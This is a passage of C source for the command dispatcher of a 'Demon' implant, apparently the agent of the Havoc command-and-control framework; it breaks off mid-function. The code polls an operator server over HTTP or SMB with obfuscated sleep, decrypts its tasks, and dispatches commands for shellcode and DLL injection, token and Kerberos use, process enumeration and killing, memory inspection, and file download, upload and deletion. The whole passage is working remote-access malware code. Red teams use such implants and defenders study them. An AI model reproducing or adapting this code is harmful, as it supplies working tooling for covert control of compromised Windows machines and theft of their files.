#include <Demon.h>

#include <Common/Macros.h>

#include <Core/Command.h>
#include <Core/Token.h>
#include <Core/Package.h>
#include <Core/MiniStd.h>
#include <Core/SleepObf.h>
#include <Core/Download.h>
#include <Core/Dotnet.h>
#include <Core/Kerberos.h>

#include <Loader/CoffeeLdr.h>
#include <Inject/Inject.h>

SEC_DATA DEMON_COMMAND DemonCommands[] = {
        { .ID = DEMON_COMMAND_SLEEP,                    .Function = CommandSleep                    },
        { .ID = DEMON_COMMAND_CHECKIN,                  .Function = CommandCheckin                  },
        { .ID = DEMON_COMMAND_JOB,                      .Function = CommandJob                      },
        { .ID = DEMON_COMMAND_PROC,                     .Function = CommandProc                     },
        { .ID = DEMON_COMMAND_PROC_LIST,                .Function = CommandProcList                 },
        { .ID = DEMON_COMMAND_FS,                       .Function = CommandFS                       },
        { .ID = DEMON_COMMAND_INLINE_EXECUTE,           .Function = CommandInlineExecute            },
        { .ID = DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE,  .Function = CommandAssemblyInlineExecute    },
        { .ID = DEMON_COMMAND_ASSEMBLY_VERSIONS,        .Function = CommandAssemblyListVersion      },
        { .ID = DEMON_COMMAND_CONFIG,                   .Function = CommandConfig                   },
        { .ID = DEMON_COMMAND_SCREENSHOT,               .Function = CommandScreenshot               },
        { .ID = DEMON_COMMAND_PIVOT,                    .Function = CommandPivot                    },
        { .ID = DEMON_COMMAND_NET,                      .Function = CommandNet                      },
        { .ID = DEMON_COMMAND_INJECT_DLL,               .Function = CommandInjectDLL                },
        { .ID = DEMON_COMMAND_INJECT_SHELLCODE,         .Function = CommandInjectShellcode          },
        { .ID = DEMON_COMMAND_SPAWN_DLL,                .Function = CommandSpawnDLL                 },
        { .ID = DEMON_COMMAND_TOKEN,                    .Function = CommandToken                    },
        { .ID = DEMON_COMMAND_TRANSFER,                 .Function = CommandTransfer                 },
        { .ID = DEMON_COMMAND_SOCKET,                   .Function = CommandSocket                   },
        { .ID = DEMON_COMMAND_KERBEROS,                 .Function = Commandkerberos                 },
        { .ID = DEMON_COMMAND_MEM_FILE,                 .Function = CommandMemFile                  },
        { .ID = DEMON_EXIT,                             .Function = CommandExit                     },

        // End
        { .ID = 0, .Function = NULL }
};

VOID CommandDispatcher( VOID )
{
    PPACKAGE Package;
    PARSER   Parser         = { 0 };
    LPVOID   DataBuffer     = NULL;
    SIZE_T   DataBufferSize = 0;
    PARSER   TaskParser     = { 0 };
    LPVOID   TaskBuffer     = NULL;
    UINT32   TaskBufferSize = 0;
    UINT32   CommandID      = 0;
    UINT32   RequestID      = 0;

    PRINTF( "Session ID => %x\n", Instance.Session.AgentID );

    /* Create our request task package */
    Package = PackageCreate( DEMON_COMMAND_GET_JOB );

    /* We don't want it to get destroyed. we kinda want to avoid alloc memory for it everytime. */
    Package->Destroy = FALSE;
    PackageAddInt32( Package, Instance.Session.AgentID );

    do
    {
        if ( ! Instance.Session.Connected )
            break;

        SleepObf();

        if ( ReachedKillDate() )
        {
            PackageDestroy( Package );
            KillDate();
        }

        if ( ! InWorkingHours() )
        {
            // simply call SleepObf until we reach working hours or the kill date (if set)
            continue;
        }

#ifdef TRANSPORT_HTTP
        /* Send our buffer. */
        if ( ! PackageTransmit( Package, &DataBuffer, &DataBufferSize ) && ! HostCheckup() )
        {
            PackageDestroy( Package );
            CommandExit( NULL );
        }

/* SMB */
#else
        // SMB agents simply try to read from their Pipe
        if ( ! SMBGetJob( &DataBuffer, &DataBufferSize ) )
        {
            PUTS( "SMBGetJob failed" )
            continue;
        }
#endif

        if ( DataBuffer && DataBufferSize > 0 )
        {
            ParserNew( &Parser, DataBuffer, DataBufferSize );
            do
            {
                RequestID  = ParserGetInt32( &Parser );
                CommandID  = ParserGetInt32( &Parser );
                TaskBuffer = ParserGetBytes( &Parser, &TaskBufferSize );

                Instance.CurrentRequestID = RequestID;

                if ( CommandID != DEMON_COMMAND_NO_JOB )
                {
                    PRINTF( "Task => RequestID:[%d : %x] CommandID:[%d : %x] TaskBuffer:[%x : %d]\n", RequestID, RequestID, CommandID, CommandID, TaskBuffer, TaskBufferSize )
                    if ( TaskBufferSize != 0 )
                    {
                        ParserNew( &TaskParser, TaskBuffer, TaskBufferSize );
                        ParserDecrypt( &TaskParser, Instance.Config.AES.Key, Instance.Config.AES.IV );
                    }

                    for ( UINT32 FunctionCounter = 0 ;; FunctionCounter++ )
                    {
                        if ( DemonCommands[ FunctionCounter ].Function == NULL )
                            break;

                        if ( DemonCommands[ FunctionCounter ].ID == CommandID )
                        {
                            DemonCommands[ FunctionCounter ].Function( &TaskParser );
                            break;
                        }
                    }
                }

                //PRINTF("TaskParser.Length: %x\n", TaskParser.Length);
            } while ( Parser.Length > 12 );

            MemSet( DataBuffer, 0, DataBufferSize );
            Instance.Win32.LocalFree( DataBuffer );
            DataBuffer = NULL;

            ParserDestroy( &Parser );
            ParserDestroy( &TaskParser );
        }
        else
        {
#ifdef TRANSPORT_HTTP
            PUTS( "TransportSend: Failed" )
            break;
#endif
        }

        /* Check if there is something that a process output is available or check if the jobs are still alive. */
        JobCheckList();

        /* Check if we have something in our Pivots connection and sends back the output from the pipes */
        PivotPush();

        /* push any download chunks we have. */
        DownloadPush();

        /* push any dotnet output we have. */
        DotnetPush();

        /* push any new clients or output from the sockets */
        SocketPush();

    } while ( TRUE );

    Instance.Session.Connected = FALSE;

    PackageDestroy( Package );

    PUTS( "Out of while loop" )
}

VOID CommandCheckin( PPARSER Parser )
{
    PUTS( "Checkin" )

    PPACKAGE Package = PackageCreate( DEMON_COMMAND_CHECKIN );

    DemonMetaData( &Package, FALSE );

    PackageTransmit( Package, NULL, NULL );
}

VOID CommandSleep( PPARSER Parser )
{
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_SLEEP );

    Instance.Config.Sleeping = ParserGetInt32( Parser );
    Instance.Config.Jitter   = ParserGetInt32( Parser );
    PRINTF( "Instance.Sleeping: [%d]\n", Instance.Config.Sleeping );
    PRINTF( "Instance.Jitter  : [%d]\n", Instance.Config.Jitter );

    PackageAddInt32( Package, Instance.Config.Sleeping );
    PackageAddInt32( Package, Instance.Config.Jitter );
    PackageTransmit( Package, NULL, NULL );
}

VOID CommandJob( PPARSER Parser )
{
    PUTS( "Job" )
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_JOB );
    DWORD    Command = ParserGetInt32( Parser );

    PackageAddInt32( Package, Command );

    switch ( Command )
    {
        case DEMON_COMMAND_JOB_LIST:
        {
            PUTS( "Job::list" )
            PJOB_DATA JobList = Instance.Jobs;

            do {
                if ( JobList )
                {
                    PRINTF( "Job => JobID:[%d] Type:[%d] State:[%d]\n", JobList->JobID, JobList->Type, JobList->State )

                    PackageAddInt32( Package, JobList->JobID );
                    PackageAddInt32( Package, JobList->Type );
                    PackageAddInt32( Package, JobList->State );

                    JobList = JobList->Next;
                } else
                    break;

            } while ( TRUE );

            break;
        }

        case DEMON_COMMAND_JOB_SUSPEND:
        {
            PUTS( "Job::suspend" )
            DWORD JobID   = ParserGetInt32( Parser );
            BOOL  Success = JobSuspend( JobID );

            PRINTF( "JobID:[%d] Success:[%d]", JobID, Success )

            PackageAddInt32( Package, JobID   );
            PackageAddInt32( Package, Success );

            break;
        }

        case DEMON_COMMAND_JOB_RESUME:
        {
            PUTS( "Job::resume" )
            DWORD JobID   = ParserGetInt32( Parser );
            BOOL  Success = JobResume( JobID );

            PackageAddInt32( Package, JobID   );
            PackageAddInt32( Package, Success );

            break;
        }

        case DEMON_COMMAND_JOB_KILL_REMOVE:
        {
            PUTS( "Job::kill" )
            DWORD JobID   = ParserGetInt32( Parser );
            BOOL  Success = JobKill( JobID );

            PackageAddInt32( Package, JobID   );
            PackageAddInt32( Package, Success );

            break;
        }
    }

    PackageTransmit( Package, NULL, NULL );
}

VOID CommandProc( PPARSER Parser )
{
    SHORT       SubCommand  = ( SHORT ) ParserGetInt32( Parser );
    PPACKAGE    Package     = PackageCreate( DEMON_COMMAND_PROC );

    PackageAddInt32( Package, SubCommand );

    switch ( SubCommand )
    {
        case DEMON_COMMAND_PROC_MODULES: PUTS("Proc::Modules")
        {
            PROCESS_BASIC_INFORMATION ProcessBasicInfo = { 0 };
            UINT32                    ProcessID        = 0;
            HANDLE                    hProcess         = NULL;
            HANDLE                    hToken           = NULL;
            NTSTATUS                  NtStatus         = STATUS_SUCCESS;

            if ( Parser->Length > 0 )
                ProcessID = ParserGetInt32( Parser );
            else
                ProcessID = Instance.Session.PID;

            hProcess = ProcessOpen( ProcessID, PROCESS_ALL_ACCESS );
            Instance.Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken );

            NtStatus = Instance.Syscall.NtQueryInformationProcess( hProcess, ProcessBasicInformation, &ProcessBasicInfo, sizeof( PROCESS_BASIC_INFORMATION ), 0 );
            if ( NT_SUCCESS( NtStatus ) )
            {
                PPEB_LDR_DATA           LoaderData              = NULL;
                PLIST_ENTRY             ListHead, ListEntry     = NULL;
                SIZE_T                  Size                    = 0;
                LDR_DATA_TABLE_ENTRY    CurrentModule           = { 0 };
                WCHAR                   ModuleNameW[ MAX_PATH ] = { 0 };
                CHAR                    ModuleName[ MAX_PATH ]  = { 0 };

                PackageAddInt32( Package, ProcessID );

                if ( NT_SUCCESS( Instance.Syscall.NtReadVirtualMemory( hProcess, &ProcessBasicInfo.PebBaseAddress->Ldr, &LoaderData, sizeof( PPEB_LDR_DATA ), &Size ) ) )
                {
                    ListHead = & LoaderData->InMemoryOrderModuleList;

                    Size = 0;
                    if ( NT_SUCCESS( Instance.Syscall.NtReadVirtualMemory( hProcess, &LoaderData->InMemoryOrderModuleList.Flink, &ListEntry, sizeof( PLIST_ENTRY ), NULL ) ) )
                    {
                        while ( ListEntry != ListHead )
                        {
                            if ( NT_SUCCESS( Instance.Syscall.NtReadVirtualMemory( hProcess, CONTAINING_RECORD( ListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks ), &CurrentModule, sizeof( CurrentModule ), NULL ) ) )
                            {
                                Instance.Syscall.NtReadVirtualMemory( hProcess, CurrentModule.FullDllName.Buffer, &ModuleNameW, CurrentModule.FullDllName.Length, &Size );

                                if ( CurrentModule.FullDllName.Length > 0 )
                                {
                                    Size = WCharStringToCharString( ModuleName, ModuleNameW, CurrentModule.FullDllName.Length );

                                    PackageAddString( Package, ModuleName );
                                    PackageAddPtr( Package, CurrentModule.DllBase );
                                }

                                MemSet( ModuleNameW, 0, MAX_PATH );
                                MemSet( ModuleName, 0, MAX_PATH );

                                ListEntry = CurrentModule.InMemoryOrderLinks.Flink;
                            }
                        }
                    }
                }
            }

            if ( hProcess )
                Instance.Win32.NtClose( hProcess );

            if ( hToken )
                Instance.Win32.NtClose( hToken );

            break;
        }

        case DEMON_COMMAND_PROC_GREP: PUTS("Proc::Grep")
        {
            PSYSTEM_PROCESS_INFORMATION SysProcessInfo  = NULL;
            PSYSTEM_PROCESS_INFORMATION PtrProcessInfo  = NULL; /* is going to hold the original pointer of SysProcessInfo */
            SIZE_T                      ProcessInfoSize = 0;
            NTSTATUS                    NtStatus        = STATUS_SUCCESS;
            ULONG32                     ProcessSize     = 0;
            PCHAR                       ProcessName     = NULL;

            /* Process Name and Process User token */
            CHAR    ProcName[ MAX_PATH ] = { 0 };
            PCHAR   ProcUserName         = NULL;
            UINT32  ProcUserSize         = 0;

            ProcessName = ParserGetString( Parser, &ProcessSize );

            if ( NT_SUCCESS( NtStatus = ProcessSnapShot( &SysProcessInfo, &ProcessInfoSize ) ) )
            {
                PRINTF( "SysProcessInfo: %p\n", SysProcessInfo );

                /* save the original pointer to free */
                PtrProcessInfo = SysProcessInfo;

                while ( TRUE )
                {
                    WCharStringToCharString( ProcName, SysProcessInfo->ImageName.Buffer, SysProcessInfo->ImageName.Length );
                    INT32 MemRet = MemCompare( ProcName, ProcessName, ProcessSize );

                    if ( MemRet == 0 )
                    {
                        HANDLE hProcess = NULL;
                        HANDLE hToken   = NULL;

                        hProcess = ProcessOpen( ( DWORD ) ( ULONG_PTR ) SysProcessInfo->UniqueProcessId, ( Instance.Session.OSVersion > WIN_VERSION_XP ) ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION );
                        if ( ! hProcess )
                            continue;

                        if ( NT_SUCCESS( Instance.Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken ) ) )
                            ProcUserName = TokenGetUserDomain( hToken, &ProcUserSize );

                        PackageAddString( Package, ProcName );
                        PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) SysProcessInfo->UniqueProcessId  );
                        PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) SysProcessInfo->InheritedFromUniqueProcessId );
                        PackageAddString( Package, ProcUserName );
                        PackageAddInt32( Package, ProcessIsWow( hProcess ) ? 86 : 64 );

                        Instance.Win32.NtClose( hProcess );
                        hProcess = NULL;

                        if ( hToken )
                            Instance.Win32.NtClose( hToken );
                        hToken = NULL;

                        MemSet( ProcUserName, 0, ProcUserSize );
                        if ( ProcUserName )
                            Instance.Win32.LocalFree( ProcUserName );
                    }

                    if ( SysProcessInfo->NextEntryOffset == 0 )
                        break;

                    SysProcessInfo = C_PTR( U_PTR( SysProcessInfo ) + SysProcessInfo->NextEntryOffset );
                }

                if ( PtrProcessInfo )
                {
                    MemSet( PtrProcessInfo, 0, ProcessInfoSize );
                    NtHeapFree( PtrProcessInfo );
                    PtrProcessInfo = NULL;
                    SysProcessInfo = NULL;
                }
            }
            else
            {
                NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
                CALLBACK_ERROR_WIN32;
            }

            break;
        }

        case DEMON_COMMAND_PROC_CREATE: PUTS( "Proc::Create" )
        {
            PROCESS_INFORMATION ProcessInfo     = { 0 };
            UINT32              ProcessSize     = 0;
            UINT32              ProcessArgsSize = 0;
            UINT32              ProcessState    = ParserGetInt32( Parser );
            PWCHAR              Process         = ParserGetWString( Parser, &ProcessSize );
            PWCHAR              ProcessArgs     = ParserGetWString( Parser, &ProcessArgsSize );
            BOOL                ProcessPiped    = ParserGetInt32( Parser );
            BOOL                ProcessVerbose  = ParserGetInt32( Parser );
            BOOL                Success         = FALSE;

            if ( ProcessSize == 0 )
                Process = NULL;

            if ( ProcessArgsSize == 0 )
                ProcessArgs = NULL;

            PRINTF( "Process State   : %d\n", ProcessState );
            PRINTF( "Process         : %ls [%d]\n", Process, ProcessSize );
            PRINTF( "Process Args    : %ls [%d]\n", ProcessArgs, ProcessArgsSize );
            PRINTF( "Process Piped   : %s [%d]\n", ProcessPiped ? "TRUE" : "FALSE", ProcessPiped );
            PRINTF( "Process Verbose : %s [%d]\n", ProcessVerbose ? "TRUE" : "FALSE", ProcessVerbose );

            // TODO: make it optional to choose process arch
            Success = ProcessCreate( TRUE, Process, ProcessArgs, ProcessState, &ProcessInfo, ProcessPiped, NULL );

            PackageAddWString( Package, Process );
            PackageAddInt32( Package, Success ? ProcessInfo.dwProcessId : 0 );
            PackageAddInt32( Package, Success );
            PackageAddInt32( Package, ProcessPiped );
            PackageAddInt32( Package, ProcessVerbose );

            if ( Success )
            {
                Instance.Win32.NtClose( ProcessInfo.hThread );
                if ( ! ProcessPiped )
                    Instance.Win32.NtClose( ProcessInfo.hProcess );

                PRINTF( "Successful spawned process: %d\n", ProcessInfo.dwProcessId );
            }

            break;
        }

        case DEMON_COMMAND_PROC_MEMORY: PUTS( "Proc::Memory" )
        {
            DWORD                    ProcessID   = ParserGetInt32( Parser );
            DWORD                    QueryProtec = ParserGetInt32( Parser );
            MEMORY_BASIC_INFORMATION MemInfo     = {};
            LPVOID                   Offset      = 0;
            SIZE_T                   Result      = 0;
            HANDLE                   hProcess    = NULL;

            hProcess = ProcessOpen( ProcessID, PROCESS_ALL_ACCESS );
            if ( hProcess )
            {
                PackageAddInt32( Package, ProcessID );
                PackageAddInt32( Package, QueryProtec );

                while ( NT_SUCCESS( Instance.Syscall.NtQueryVirtualMemory( hProcess, Offset, MemoryBasicInformation, &MemInfo, sizeof( MemInfo ), &Result ) ) )
                {
                    Offset = C_PTR( U_PTR( MemInfo.BaseAddress ) + MemInfo.RegionSize );

                    if ( MemInfo.Type != MEM_FREE )
                    {
                        if ( MemInfo.AllocationBase != 0 )
                        {
                            if ( QueryProtec == 0 )
                            {
                                // Since the Protection to query isn't specified we just list every memory region
                                PackageAddPtr( Package, MemInfo.BaseAddress );
                                PackageAddInt32( Package, MemInfo.RegionSize );
                                PackageAddInt32( Package, MemInfo.AllocationProtect );
                                PackageAddInt32( Package, MemInfo.State );
                                PackageAddInt32( Package, MemInfo.Type );
                            }
                            else
                            {
                                if ( QueryProtec == MemInfo.AllocationProtect )
                                {
                                    PRINTF( "Search for memory region: %d\n", QueryProtec )
                                    // Add found memory region with specified memory protection
                                    PackageAddPtr( Package, MemInfo.BaseAddress );
                                    PackageAddInt32( Package, MemInfo.RegionSize );
                                    PackageAddInt32( Package, MemInfo.AllocationProtect );
                                    PackageAddInt32( Package, MemInfo.State );
                                    PackageAddInt32( Package, MemInfo.Type );
                                }
                            }
                        }
                    }
                }

                Offset = NULL;
            }

            if ( hProcess )
            {
                Instance.Win32.NtClose( hProcess );
                hProcess = NULL;
            }

            break;
        }

        case DEMON_COMMAND_PROC_KILL: PUTS( "Proc::Kill" )
        {
            DWORD  dwProcessID = ParserGetInt32( Parser );
            HANDLE hProcess    = NULL;

            hProcess = ProcessOpen( dwProcessID, PROCESS_TERMINATE );
            if ( hProcess )
                Instance.Win32.TerminateProcess( hProcess, 0 );

            PackageAddInt32( Package, hProcess ? TRUE : FALSE );
            PackageAddInt32( Package, dwProcessID );

            if ( hProcess )
            {
                Instance.Win32.NtClose( hProcess );
                hProcess = NULL;
            }

            break;
        }
    }

    // TODO: handle error
    PackageTransmit( Package, NULL, NULL );
}


VOID CommandProcList( PPARSER Parser )
{
    PSYSTEM_PROCESS_INFORMATION SysProcessInfo  = NULL;
    PSYSTEM_PROCESS_INFORMATION PtrProcessInfo  = NULL; /* is going to hold the original pointer of SysProcessInfo */
    SIZE_T                      ProcessInfoSize = 0;
    PPACKAGE                    Package         = NULL;
    NTSTATUS                    NtStatus        = STATUS_SUCCESS;
    DWORD                       ProcessUI       = 0;

    if ( NT_SUCCESS( NtStatus = ProcessSnapShot( &SysProcessInfo, &ProcessInfoSize ) ) )
    {
        PRINTF( "SysProcessInfo: %p\n", SysProcessInfo );

        /* save the original pointer to free */
        PtrProcessInfo = SysProcessInfo;

        /* Create our package */
        Package   = PackageCreate( DEMON_COMMAND_PROC_LIST );
        ProcessUI = ParserGetInt32( Parser );

        /* did we get this request from the Client Process Explorer or Console ? */
        PackageAddInt32( Package, ProcessUI );

        while ( TRUE )
        {
            PCHAR  ProcessUser = NULL;
            HANDLE hToken      = NULL;
            UINT32 UserSize    = 0;
            HANDLE hProcess    = NULL;

            /* open handle to each process with query information privilege since we dont need anything else besides basic info */
            hProcess = ProcessOpen( ( DWORD ) ( ULONG_PTR ) SysProcessInfo->UniqueProcessId, ( Instance.Session.OSVersion > WIN_VERSION_XP ) ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION );
            if ( ! hProcess )
                continue;

            /* Retrieve process token user */
            if ( NT_SUCCESS( Instance.Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken ) ) )
                ProcessUser = TokenGetUserDomain( hToken, &UserSize );

            /* Now we append the collected process data to the process list  */
            PackageAddWString( Package, SysProcessInfo->ImageName.Buffer );
            PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) SysProcessInfo->UniqueProcessId );
            PackageAddInt32( Package, ProcessIsWow( hProcess ) );
            PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) SysProcessInfo->InheritedFromUniqueProcessId );
            PackageAddInt32( Package, SysProcessInfo->SessionId );
            PackageAddInt32( Package, SysProcessInfo->NumberOfThreads );
            PackageAddString( Package, ProcessUser );

            /* Now lets cleanup */
#ifdef DEBUG
            /* ignore this. is just for the debug prints.
             * if we close the handle to our own process we won't see any debug prints anymore */
            if ( ( DWORD ) ( ULONG_PTR ) SysProcessInfo->UniqueProcessId != Instance.Session.PID )
                Instance.Win32.NtClose( hProcess );
#else
            if ( hProcess )
                Instance.Win32.NtClose( hProcess );
#endif

            if ( hToken )
                Instance.Win32.NtClose( hToken );

            if ( ProcessUser )
            {
                MemSet( ProcessUser, 0, UserSize );
                Instance.Win32.LocalFree( ProcessUser );
                ProcessUser = NULL;
            }

            /* there are no processes left. */
            if ( ! SysProcessInfo->NextEntryOffset )
                break;

            /* now go to the next process */
            SysProcessInfo = C_PTR( U_PTR( SysProcessInfo ) + SysProcessInfo->NextEntryOffset );
        }

        PackageTransmit( Package, NULL, NULL );

        /* Free our process list */
        if ( PtrProcessInfo )
        {
            MemSet( PtrProcessInfo, 0, ProcessInfoSize );
            NtHeapFree( PtrProcessInfo );
            PtrProcessInfo = NULL;
            SysProcessInfo = NULL;
        }
    }
    else
    {
        NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
        CALLBACK_ERROR_WIN32;
    }
}

VOID CommandFS( PPARSER Parser )
{
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_FS );
    DWORD    Command = ParserGetInt32( Parser );

    PackageAddInt32( Package, Command );

    switch ( Command )
    {
        case DEMON_COMMAND_FS_DIR: PUTS( "FS::Dir" )
        {
            WIN32_FIND_DATAW FindData      = { 0 };
            LPWSTR           Path          = NULL;
            UINT32           PathSize      = 0;
            WCHAR            T[ MAX_PATH ] = { 0 };
            HANDLE           hFile         = NULL;
            ULARGE_INTEGER   FileSize      = { 0 };
            SYSTEMTIME       FileTime      = { 0 };
            SYSTEMTIME       SystemTime    = { 0 };
            DWORD            Return        = 0;
            BOOL             FileExplorer  = FALSE;

            FileExplorer     = ParserGetInt32( Parser );
            Path             = ParserGetWString( Parser, &PathSize );

            PRINTF( "FileExplorer: %s [%d]\n", FileExplorer ? "TRUE" : "FALSE", FileExplorer )
            PRINTF( "Path        : %ls\n", Path )

            PackageAddInt32( Package, FileExplorer );

            if ( Path[ 0 ] == L'.' )
            {
                if ( ! ( Return = Instance.Win32.GetCurrentDirectoryW( MAX_PATH * 2, T ) ) )
                {
                    PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                }
                else
                    PackageAddWString( Package, T );
            }
            else
            {
                PackageAddWString( Package, Path );
            }

            MemSet( &FindData, 0, sizeof( FindData ) );

            hFile = Instance.Win32.FindFirstFileW( Path, &FindData );
            if ( hFile == INVALID_HANDLE_VALUE )
            {
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                Instance.Win32.FindClose( hFile );

                PUTS( "LEAVE" )
                goto LEAVE;
            }

            do
            {
                Instance.Win32.FileTimeToSystemTime( &FindData.ftLastAccessTime, &FileTime );
                Instance.Win32.SystemTimeToTzSpecificLocalTime( 0, &FileTime, &SystemTime );

                if ( FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
                {
                    PackageAddInt32( Package, TRUE );
                    PackageAddInt64( Package, 0 );
                }
                else
                {
                    FileSize.HighPart = FindData.nFileSizeHigh;
                    FileSize.LowPart  = FindData.nFileSizeLow;

                    PackageAddInt32( Package, FALSE );
                    PackageAddInt64( Package, FileSize.QuadPart );
                }

                PackageAddInt32( Package, FileTime.wDay );
                PackageAddInt32( Package, FileTime.wMonth );
                PackageAddInt32( Package, FileTime.wYear );
                PackageAddInt32( Package, SystemTime.wSecond );
                PackageAddInt32( Package, SystemTime.wMinute );
                PackageAddInt32( Package, SystemTime.wHour );
                PackageAddWString( Package, FindData.cFileName );
            }
            while ( Instance.Win32.FindNextFileW( hFile, &FindData ) );

            PUTS( "Close File Handle" )
            Instance.Win32.FindClose( hFile );

            break;
        }

        case DEMON_COMMAND_FS_DOWNLOAD: PUTS( "FS::Download" )
        {
            PDOWNLOAD_DATA Download = NULL;
            BUFFER         FileName = { 0 };
            DWORD          FileSize = 0;
            PVOID          Buffer   = NULL;
            HANDLE         hFile    = NULL;
            BOOL           Success  = TRUE;
            WCHAR          FilePath[ MAX_PATH * 2 ] = { 0 };
            WCHAR          PathSize = MAX_PATH * 2;

            Buffer = ParserGetBytes( Parser, &FileName.Length );

            FileName.Buffer = NtHeapAlloc( FileName.Length + sizeof( WCHAR ) );
            MemCopy( FileName.Buffer, Buffer, FileName.Length );

            PRINTF( "FileName => %ls\n", FileName.Buffer )

            hFile = Instance.Win32.CreateFileW( FileName.Buffer, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0 );
            if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
            {
                PUTS( "CreateFileW: Failed" )

                CALLBACK_GETLASTERROR

                Success = FALSE;
                goto CleanupDownload;
            }

            PathSize = Instance.Win32.GetFullPathNameW( FileName.Buffer, PathSize, FilePath, NULL );
            PRINTF( "FilePath.Buffer[%d]: %ls\n", PathSize, FilePath )

            FileSize = Instance.Win32.GetFileSize( hFile, 0 );

            /* Start our download. */
            if ( PathSize > 0 )
                Download = DownloadAdd( hFile, FileSize );
            else
                Download = DownloadAdd( hFile, FileSize );

            Download->RequestID = Instance.CurrentRequestID;

            /*
			 * Download Header:
			 *  [ Mode      ] Open ( 0 ), Write ( 1 ) or Close ( 2 )
			 *  [ File ID   ] Download File ID
			 *
			 * Data (Open):
			 *  [ File Size ]
			 *  [ File Name ]
			 *
			 * Data (Write)
			 *  [ Chunk Data ] Size + FileChunk
			 *
			 * Data (Close):
			 *  [  Reason   ] Removed or Finished
			 * */

            /* Download Header */
            PackageAddInt32( Package, DOWNLOAD_MODE_OPEN );
            PackageAddInt32( Package, Download->FileID   );

            /* Download Open Data */
            PackageAddInt32( Package, FileSize ); /* TODO: change this to 64bit or else we can't download files larger than 4gb */
            if ( PathSize > 0 )
                PackageAddWString( Package, FilePath );
            else
                PackageAddWString( Package, FileName.Buffer );

        CleanupDownload:
            PUTS( "CleanupDownload" )

            if ( FileName.Buffer )
            {
                MemSet( FileName.Buffer, 0, FileName.Length );
                NtHeapFree( FileName.Buffer );
                FileName.Buffer = NULL;
            }

            if ( ! Success )
                goto LEAVE;

            break;
        }

        case DEMON_COMMAND_FS_UPLOAD: PUTS( "FS::Upload" )
        {
            DWORD     FileSize  = 0;
            UINT32    NameSize  = 0;
            DWORD     Written   = 0;
            HANDLE    hFile     = NULL;
            LPWSTR    FileName  = ParserGetWString( Parser, &NameSize );
            ULONG     MemFileID = ParserGetInt32( Parser );
            PMEM_FILE MemFile   = GetMemFile( MemFileID );
            BOOL      Success   = TRUE;
            PVOID     Content   = NULL;

            // TODO: handle error and communicate to the TS

            if ( MemFile && MemFile->IsCompleted )
            {
                Content  = MemFile->Data;
                FileSize = MemFile->Size;
            }
            else if ( MemFile && ! MemFile->IsCompleted )
            {
                PRINTF( "MemFile [%x] was not completed\n", MemFileID );
                Success = FALSE;
                goto CleanupUpload;
            }
            else
            {
                PRINTF( "MemFile [%x] not found\n", MemFileID );
                Success = FALSE;
                goto CleanupUpload;
            }

            PRINTF( "FileName[%d] => %ls\n", FileSize, FileName )

            hFile = Instance.Win32.CreateFileW( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
            if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
            {
                PUTS( "CreateFileW: Failed" )
                CALLBACK_GETLASTERROR
                Success = FALSE;
                goto CleanupUpload;
            }

            if ( ! Instance.Win32.WriteFile( hFile, Content, FileSize, &Written, NULL ) )
            {
                PUTS( "WriteFile: Failed" )
                CALLBACK_GETLASTERROR
                Success = FALSE;
                goto CleanupUpload;
            }

            PackageAddInt32( Package, FileSize );
            PackageAddWString( Package, FileName );

        CleanupUpload:
            if ( hFile )
            {
                Instance.Win32.NtClose( hFile );
                hFile = NULL;
            }

            if ( ! Success )
                goto LEAVE;

            break;
        }

        case DEMON_COMMAND_FS_CD: PUTS( "FS::Cd" )
        {
            UINT32 PathSize = 0;
            LPWSTR Path     = ParserGetWString( Parser, &PathSize );

            if ( ! Instance.Win32.SetCurrentDirectoryW( Path ) )
            {
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                goto LEAVE;
            }
            else
            {
                PackageAddWString( Package, Path );
            }

            break;
        }

        case DEMON_COMMAND_FS_REMOVE: PUTS( "FS::Remove" )
        {
            UINT32 PathSize = 0;
            LPWSTR Path     = ParserGetWString( Parser, &PathSize );
            DWORD  dwAttrib = Instance.Win32.GetFileAttributesW( Path );

            if ( dwAttrib != INVALID_FILE_ATTRIBUTES && ( dwAttrib & FILE_ATTRIBUTE_DIRECTORY ) )
            {
                if ( ! Instance.Win32.RemoveDirectoryW( Path ) )
                {
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                    goto LEAVE;
                }
                else
                {
                    PackageAddInt32( Package, TRUE );
                }
            }
            else
            {
                if ( ! Instance.Win32.DeleteFileW( Path ) )
                {
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                    goto LEAVE;
                }
                else
                {
                    PackageAddInt32( Package, FALSE );
                }
            }
            PackageAddWString( Package, Path );

            break;
        }

        case DEMON_COMMAND_FS_MKDIR: PUTS( "FS::Mkdir" )
        {
            UINT32 PathSize = 0;
            LPWSTR Path     = ParserGetWString( Parser, &PathSize );

            if ( ! Instance.Win32.CreateDirectoryW( Path, NULL ) )
            {
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                goto LEAVE;
            }

            PackageAddWString( Package, Path );

            break;
        }

